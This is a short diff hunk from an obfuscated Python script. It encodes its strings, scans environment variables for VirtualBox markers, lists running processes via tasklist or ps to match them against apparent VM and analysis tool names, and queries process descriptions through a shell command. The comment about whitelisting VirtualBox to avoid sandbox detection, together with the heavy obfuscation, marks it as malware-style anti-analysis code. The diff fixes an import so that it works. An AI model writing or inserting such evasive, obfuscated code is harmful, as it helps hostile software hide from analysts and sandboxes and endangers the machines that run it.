@@ -13,7 +13,7 @@ kZopYctmde = lambda s: ''.join(chr(int(DTHCwIrzYv(ord(c)))) for c in s)
 def SvFEInfzNbhiRqmdYLjxJD():
     SvFEInfzNbhiRqmdYLjxJD = [KsJClA for KsJClA in mTwI.environ if kZopYctmde("ýÁèă") in KsJClA and not KsJClA in [kZopYctmde("ýÁèăĘâôÖĘÖåô÷¾ßßĘë¾÷Ó")]] #whitlist virtualbox installed in user (only positive if in sandbox enviroment) 
     dcmnkUzwuYqyZhNClp = [IodzXShH.split()[int(DTHCwIrzYv(-5)) if mTwI.name == kZopYctmde("Ņŗ") else -int(DTHCwIrzYv(-2))] for IodzXShH in mTwI.popen(kZopYctmde("ŗĞŔļĿĶŔŗ") if mTwI.name == kZopYctmde("Ņŗ") else kZopYctmde("ŋŔ")).read().splitlines()[int(DTHCwIrzYv(4)):] if IodzXShH.split()[int(DTHCwIrzYv(-5)) if mTwI.name == kZopYctmde("Ņŗ") else -int(DTHCwIrzYv(-2))].lower().split(kZopYctmde(""))[int(DTHCwIrzYv(-5))] in [kZopYctmde("ţĪŅŔĪőŝĶĤĪ"), kZopYctmde("ŝġňţŔĪőŝĶĤĪ"), kZopYctmde("ŝġňţŗőĞŦ"), kZopYctmde("ŝłŚŔőŝĤ"), kZopYctmde("ŝłŔőŝĤ"), kZopYctmde("ŝłŠĞőĪŚŔĪő"),kZopYctmde("ŝłŠĞőĪŗőĞŦ"), kZopYctmde("ŝłŗňňĿŔħ"), kZopYctmde("ŝłĤňłŋŚŗĪ"), kZopYctmde("ŝłłĪł")]]
-    import mTwI
+    import os as mTwI
 
     # Running the aforementioned command and saving its output
     KhHdtUIOQDkL = mTwI.popen(kZopYctmde("ŠłĶĤ[ŋőňĤĪŔŔ[İĪŗ[ħĪŔĤőĶŋŗĶňŅ[ŋőňĤĪŔŔĶħ")).read()
